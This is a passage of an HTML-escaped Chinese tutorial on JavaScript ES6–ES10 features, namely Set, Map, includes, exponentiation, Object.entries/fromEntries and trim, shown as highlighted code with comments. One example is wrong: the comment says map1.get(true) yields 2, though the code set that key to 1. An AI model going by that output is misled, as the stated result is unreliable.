&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(1) { 1 }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 传入的数组中有重复项，会自动去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;])
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(4) { 1, 2, &amp;#39;A&amp;#39;, 3 }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 两个对象都是不同的指针，所以没法去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, {&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;}, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, {&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;}])
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(4) { 1, { name: &amp;#39;A&amp;#39; }, 2, { name: &amp;#39;A&amp;#39; } }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 如果是两个对象是同一指针，则能去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;}
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;])
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(3) { 1, { name: &amp;#39;A&amp;#39; }, 2 }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// NaN !== NaN，NaN是自身不等于自身的，但是在Set中他还是会被去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;])
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(2) { 1, NaN }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Set可利用扩展运算符转为数组，以实现数组去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;quchongArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [...&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;)]
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;quchongArr&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// [1,  2, 3, 4, 5, 66, 9]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Map 对象保存键值对，并且能够记住键的原始插入顺序。任何值（对象或者原始值）都可以作为一个键或一个值。Map 对比 object 最大的好处就是，key 不受类型限制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Map&lt;/span&gt;()
&lt;span style=&#34;color:#75715e&#34;&gt;// 新增键值对 使用 set(key, value)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;嘻嘻嘻&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Map(3) { true =&amp;gt; 1, 1 =&amp;gt; 2, &amp;#39;哈哈&amp;#39; =&amp;gt; &amp;#39;嘻嘻嘻&amp;#39; }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 判断map是否含有某个key 使用 has(key)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;has&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 获取map中某个key对应的value 使用 get(key)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 删除map中某个键值对 使用 delete(key)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Map(2) { true =&amp;gt; 1, 1 =&amp;gt; 2 }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 定义map，也可传入键值对数组集合
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;map2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Map&lt;/span&gt;([[&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;嘻嘻嘻&amp;#39;&lt;/span&gt;]])
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Map(3) { true =&amp;gt; 1, 1 =&amp;gt; 2, &amp;#39;哈哈&amp;#39; =&amp;gt; &amp;#39;嘻嘻嘻&amp;#39; }
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;es7&#34;&gt;ES7&lt;/h1&gt;
&lt;h2 id=&#34;1includes&#34;&gt;1.includes&lt;/h2&gt;
&lt;p&gt;传入元素，如果数组中能找到此元素，则返回 true，否则返回 false&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;includeArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; , &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isKobe&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;includeArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isKobe&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跟 indexOf 很像，但还是有区别的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;]
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// -1  indexOf找不到NaN
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;NaN&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// true includes能找到NaN
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2求幂运算符&#34;&gt;2.求幂运算符&lt;/h2&gt;
&lt;p&gt;ES7提供了求幂运算符：&lt;code&gt;**&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;es8&#34;&gt;ES8&lt;/h1&gt;
&lt;h2 id=&#34;1objectentries&#34;&gt;1.Object.entries&lt;/h2&gt;
&lt;p&gt;获取对象的键值对集合&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;,
  &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;,
  &lt;span style=&#34;color:#a6e22e&#34;&gt;gender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;男&amp;#39;&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;entries&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;entries&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;entries&lt;/span&gt;) 
&lt;span style=&#34;color:#75715e&#34;&gt;// [ [ &amp;#39;name&amp;#39;, &amp;#39;A&amp;#39; ], [ &amp;#39;age&amp;#39;, 22 ], [ &amp;#39;gender&amp;#39;, &amp;#39;男&amp;#39; ] ]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;es10&#34;&gt;ES10&lt;/h1&gt;
&lt;h2 id=&#34;1objectfromentries&#34;&gt;1.Object.fromEntries&lt;/h2&gt;
&lt;p&gt;ES8 的 Object.entries 是把对象转成键值对数组，而 Object.fromEntries 则相反，是把键值对数组转为对象&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;],
  [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;],
  [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gender&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;男&amp;#39;&lt;/span&gt;]
]

&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromEntries&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// { name: &amp;#39;A&amp;#39;, age: 22, gender: &amp;#39;男&amp;#39; }
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此外还可以把 Map 转换为对象&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Map&lt;/span&gt;()
&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;age&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gender&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;男&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Map(3) { &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;A&amp;#39;, &amp;#39;age&amp;#39; =&amp;gt; 22, &amp;#39;gender&amp;#39; =&amp;gt; &amp;#39;男&amp;#39; }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromEntries&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// { name: &amp;#39;A&amp;#39;, age: 22, gender: &amp;#39;男&amp;#39; }
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2stringtrim&#34;&gt;2.String.trim&lt;/h2&gt;
&lt;p&gt;trim 方法，可以清除字符串首尾的空格&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;    A    &amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;trim&lt;/span&gt;()) &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;A&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;trimStart 和trimEnd 用来单独去除字符串的首和尾的空格&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;    林三心    &amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;// 去除首部空格
